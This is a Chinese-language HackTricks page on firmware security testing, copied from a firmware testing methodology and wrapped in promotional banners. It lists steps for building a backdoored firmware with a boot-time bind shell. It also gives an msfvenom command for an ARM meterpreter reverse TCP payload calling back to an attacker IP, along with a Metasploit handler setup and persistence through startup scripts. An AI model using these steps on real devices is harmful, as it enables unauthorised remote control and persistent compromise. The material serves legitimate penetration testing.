<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击直到成为英雄！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


### 本页面内容复制自 [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

尝试**上传自定义固件和/或编译后的二进制文件**，检查完整性或签名验证漏洞。例如，使用以下步骤编译一个在启动时运行的后门绑定shell。

1. 使用固件修改工具包（FMK）提取固件
2. 确定目标固件的架构和字节序
3. 使用Buildroot构建交叉编译器或使用适合您环境的其他方法
4. 使用交叉编译器构建后门
5. 将后门复制到提取的固件的/usr/bin目录
6. 将适当的QEMU二进制文件复制到提取的固件rootfs
7. 使用chroot和QEMU模拟后门
8. 使用netcat连接到后门
9. 从提取的固件rootfs中移除QEMU二进制文件
10. 使用FMK重新打包修改后的固件
11. 通过使用固件分析工具包（FAT）模拟后门固件并使用netcat连接到目标后门IP和端口来测试后门固件

如果已经通过动态分析、引导程序操作或硬件安全测试等手段获得了root shell，尝试执行预编译的恶意二进制文件，如植入物或反向shell。考虑使用用于命令和控制（C&C）框架的自动化payload/植入工具。例如，可以使用Metasploit框架和'msfvenom'，按照以下步骤操作。

1. 确定目标固件的架构和字节序
2. 使用`msfvenom`指定适当的目标payload (-p)，攻击者主机IP (LHOST=)，监听端口号 (LPORT=)，文件类型 (-f)，架构 (--arch)，平台 (--platform linux或windows)，以及输出文件 (-o)。例如，`msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux`
3. 将payload传输到被攻陷的设备（例如，运行一个本地web服务器并使用wget/curl将payload下载到文件系统），并确保payload具有执行权限
4. 准备Metasploit来处理传入请求。例如，使用msfconsole启动Metasploit，并根据上述payload设置以下参数：使用exploit/multi/handler，
* `set payload linux/armle/meterpreter_reverse_tcp`
* `set LHOST 192.168.1.245 #攻击者主机IP`
* `set LPORT 445 #可以是任何未使用的端口`
* `set ExitOnSession false`
* `exploit -j -z`
5. 在被攻陷的设备上执行meterpreter反向🐚
6. 观察meterpreter会话开启
7. 进行后期利用活动

如果可能的话，识别启动脚本中的漏洞，以在设备重启后获得持久访问权限。当启动脚本引用、[符号链接](https://www.chromium.org/chromium-os/chromiumos-design-docs/hardening-against-malicious-stateful-data)或依赖于位于不受信任的挂载位置（如用于存储根文件系统之外数据的SD卡和闪存卷）中的代码时，就会出现此类漏洞。


<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击直到成为英雄！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
